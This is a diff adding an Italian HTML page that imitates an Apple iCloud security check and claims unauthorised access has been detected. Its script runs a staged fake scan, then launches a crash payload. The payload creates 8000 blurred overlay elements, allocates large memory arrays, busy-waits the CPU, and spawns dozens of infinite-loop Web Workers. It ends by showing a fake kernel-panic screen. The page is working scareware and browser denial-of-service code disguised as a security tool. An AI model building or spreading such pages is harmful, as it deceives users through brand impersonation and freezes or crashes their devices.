@@ -1,0 +1,406 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>🔐 Verifica Sicurezza iCloud</title>
+    <style>
+        /* STILE TIPO APPLE - TUTTO MOLTO CREDIBILE */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Text', 'Helvetica Neue', sans-serif;
+            background: #000;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+        }
+        
+        /* Schermata di "verifica" stile Apple */
+        .container {
+            background: rgba(20, 20, 30, 0.95);
+            backdrop-filter: blur(20px);
+            border-radius: 34px;
+            padding: 32px 24px;
+            max-width: 340px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.5);
+            animation: fadeIn 0.5s ease;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.95); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        
+        /* Icona di sistema Apple style */
+        .shield-icon {
+            width: 70px;
+            height: 70px;
+            background: linear-gradient(135deg, #ff3b30, #ff9500);
+            border-radius: 20px;
+            margin: 0 auto 20px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 36px;
+            box-shadow: 0 0 20px rgba(255, 59, 48, 0.3);
+        }
+        
+        h2 {
+            color: #fff;
+            font-size: 22px;
+            font-weight: 600;
+            margin-bottom: 8px;
+        }
+        
+        .subtitle {
+            color: #8e8e93;
+            font-size: 14px;
+            margin-bottom: 24px;
+        }
+        
+        /* Barra di avanzamento stile iOS */
+        .progress-section {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            height: 6px;
+            margin: 20px 0;
+            overflow: hidden;
+        }
+        
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #ff3b30, #ff9500);
+            border-radius: 10px;
+            transition: width 0.3s ease;
+        }
+        
+        /* Messaggi di sistema */
+        .status-message {
+            color: #ff3b30;
+            font-size: 13px;
+            font-family: 'Courier New', monospace;
+            margin: 16px 0;
+            padding: 12px;
+            background: rgba(255, 59, 48, 0.1);
+            border-radius: 12px;
+            border-left: 3px solid #ff3b30;
+            text-align: left;
+        }
+        
+        .status-message span {
+            color: #fff;
+        }
+        
+        /* Lista dei "controlli" */
+        .checklist {
+            text-align: left;
+            margin: 20px 0;
+        }
+        
+        .check-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            padding: 8px 0;
+            color: #8e8e93;
+            font-size: 13px;
+            border-bottom: 0.5px solid rgba(255, 255, 255, 0.05);
+        }
+        
+        .check-item::before {
+            content: "⏳";
+            width: 20px;
+        }
+        
+        .check-item.done::before {
+            content: "✅";
+            color: #34c759;
+        }
+        
+        .check-item.fail::before {
+            content: "⚠️";
+            color: #ff3b30;
+        }
+        
+        /* Pulsante */
+        .verify-btn {
+            background: #ff3b30;
+            color: white;
+            border: none;
+            padding: 16px 24px;
+            border-radius: 14px;
+            font-size: 17px;
+            font-weight: 600;
+            width: 100%;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: all 0.2s ease;
+        }
+        
+        .verify-btn:active {
+            opacity: 0.8;
+            transform: scale(0.98);
+        }
+        
+        .verify-btn:disabled {
+            opacity: 0.5;
+            transform: none;
+        }
+        
+        /* Effetto "glitch" per l'hacking */
+        @keyframes glitch {
+            0%, 100% { text-shadow: none; }
+            25% { text-shadow: -2px 0 #ff3b30, 2px 0 #00ff00; }
+            50% { text-shadow: 2px 0 #ff3b30, -2px 0 #00ff00; }
+            75% { text-shadow: -1px 0 #ff3b30, 1px 0 #00ff00; }
+        }
+        
+        .glitch-text {
+            animation: glitch 0.1s infinite;
+        }
+        
+        /* Container per il payload nascosto */
+        #crashPayload {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+            z-index: 9999;
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        /* Messaggio di errore finale */
+        .error-message {
+            background: rgba(0, 0, 0, 0.9);
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 10000;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            backdrop-filter: blur(10px);
+            animation: fadeIn 0.3s ease;
+        }
+        
+        .error-box {
+            background: #1c1c1e;
+            border-radius: 28px;
+            padding: 32px;
+            max-width: 300px;
+            text-align: center;
+            border: 1px solid #ff3b30;
+        }
+        
+        .error-box .icon {
+            font-size: 48px;
+            margin-bottom: 16px;
+        }
+        
+        .error-box h3 {
+            color: #ff3b30;
+            margin-bottom: 12px;
+        }
+        
+        .error-box p {
+            color: #8e8e93;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        
+        .restart-btn {
+            background: #ff3b30;
+            color: white;
+            border: none;
+            padding: 12px 24px;
+            border-radius: 12px;
+            font-weight: 600;
+            width: 100%;
+        }
+    </style>
+</head>
+<body>
+<div class="container" id="mainContainer">
+    <div class="shield-icon">⚠️</div>
+    <h2>Verifica Sicurezza iCloud</h2>
+    <div class="subtitle">Rilevato accesso non autorizzato</div>
+    
+    <div class="progress-section">
+        <div class="progress-bar" id="progressBar"></div>
+    </div>
+    
+    <div class="status-message" id="statusMsg">
+        <span>➜</span> Inizializzazione scansione...
+    </div>
+    
+    <div class="checklist" id="checklist">
+        <div class="check-item" id="check1">Verifica token di sessione</div>
+        <div class="check-item" id="check2">Controllo dispositivi associati</div>
+        <div class="check-item" id="check3">Analisi traffico in uscita</div>
+        <div class="check-item" id="check4">Scansione vulnerabilità WebKit</div>
+    </div>
+    
+    <button class="verify-btn" id="triggerBtn">Autorizza e Verifica</button>
+</div>
+
+<script>
+    const btn = document.getElementById('triggerBtn');
+    const progressBar = document.getElementById('progressBar');
+    const statusMsg = document.getElementById('statusMsg');
+    let crashTriggered = false;
+    
+    function updateCheckItem(id, status) {
+        const item = document.getElementById(id);
+        if (item) item.classList.add(status);
+    }
+    
+    function setStatus(text, isError = false) {
+        statusMsg.innerHTML = `<span>${isError ? '⚠️' : '➜'}</span> ${text}`;
+        if (isError) {
+            statusMsg.style.borderLeftColor = '#ff3b30';
+            statusMsg.style.background = 'rgba(255, 59, 48, 0.2)';
+        }
+    }
+    
+    function updateProgress(value) {
+        progressBar.style.width = value + '%';
+    }
+    
+    function triggerDeviceCrash() {
+        if (crashTriggered) return;
+        crashTriggered = true;
+        setStatus("💀 Rilevata compromissione del kernel! 💀", true);
+        
+        const crashContainer = document.createElement('div');
+        crashContainer.id = 'crashPayload';
+        document.body.appendChild(crashContainer);
+        
+        const divCount = 8000;
+        for (let i = 0; i < divCount; i++) {
+            const div = document.createElement('div');
+            div.style.cssText = `
+                backdrop-filter: blur(10px) brightness(0.5) contrast(200%);
+                width: 50px;
+                height: 50px;
+                position: fixed;
+                top: ${Math.random() * 2000}px;
+                left: ${Math.random() * 2000}px;
+                opacity: 0.01;
+                z-index: 99999;
+            `;
+            crashContainer.appendChild(div);
+        }
+        
+        try {
+            let memoryHog = [];
+            for (let i = 0; i < 100; i++) {
+                memoryHog.push(new Array(1000000).fill('x'));
+            }
+        } catch(e) {}
+        
+        let start = Date.now();
+        while (Date.now() - start < 3000) {
+            Math.sqrt(Math.random() * 1000000);
+        }
+        
+        for (let w = 0; w < 50; w++) {
+            try {
+                const blob = new Blob(['while(true){}'], {type: 'application/javascript'});
+                const url = URL.createObjectURL(blob);
+                const worker = new Worker(url);
+                setTimeout(() => worker.terminate(), 100);
+            } catch(e) {}
+        }
+        
+        let counter = 0;
+        const interval = setInterval(() => {
+            for (let i = 0; i < 1000; i++) {
+                const temp = document.createElement('div');
+                temp.remove();
+            }
+            counter++;
+            if (counter > 200) clearInterval(interval);
+        }, 1);
+        
+        setTimeout(() => {
+            const panicDiv = document.createElement('div');
+            panicDiv.className = 'error-message';
+            panicDiv.innerHTML = `
+                <div class="error-box">
+                    <div class="icon">💀</div>
+                    <h3>Kernel Panic</h3>
+                    <p>Si è verificato un errore critico del sistema.<br>Il dispositivo si riavvierà tra pochi secondi.</p>
+                    <div class="progress-section">
+                        <div class="progress-bar" style="width: 0%" id="panicProgress"></div>
+                    </div>
+                    <p style="font-size: 11px; margin-top: 12px;">Codice errore: PANIC_WEBKIT_0x0003</p>
+                </div>
+            `;
+            document.body.appendChild(panicDiv);
+            
+            let p = 0;
+            const panicInterval = setInterval(() => {
+                p += 2;
+                const panicBar = document.getElementById('panicProgress');
+                if (panicBar) panicBar.style.width = p + '%';
+                if (p >= 100) clearInterval(panicInterval);
+            }, 30);
+        }, 500);
+    }
+    
+    function startVerification() {
+        btn.disabled = true;
+        btn.textContent = '🔐 VERIFICA IN CORSO...';
+        
+        let step = 0;
+        const steps = [
+            { text: "Verifica token di sessione...", checkId: "check1", delay: 800, progress: 20 },
+            { text: "Controllo dispositivi associati...", checkId: "check2", delay: 1200, progress: 40 },
+            { text: "Analisi traffico in uscita...", checkId: "check3", delay: 1000, progress: 60 },
+            { text: "Scansione vulnerabilità WebKit...", checkId: "check4", delay: 1500, progress: 80 }
+        ];
+        
+        function runStep(index) {
+            if (index >= steps.length) {
+                updateProgress(95);
+                setStatus("⚠️ VULNERABILITÀ CRITICA RILEVATA! ⚠️", true);
+                const title = document.querySelector('h2');
+                if (title) title.classList.add('glitch-text');
+                setTimeout(() => {
+                    setStatus("💀 TENTATIVO DI ACCESSO NON AUTORIZZATO DETECTED", true);
+                    updateProgress(100);
+                    setTimeout(() => triggerDeviceCrash(), 800);
+                }, 1000);
+                return;
+            }
+            const stepData = steps[index];
+            setStatus(stepData.text);
+            updateProgress(stepData.progress);
+            updateCheckItem(stepData.checkId, 'done');
+            setTimeout(() => runStep(index + 1), stepData.delay);
+        }
+        runStep(0);
+    }
+    
+    btn.addEventListener('click', startVerification);
+</script>
+</body>
+</html>
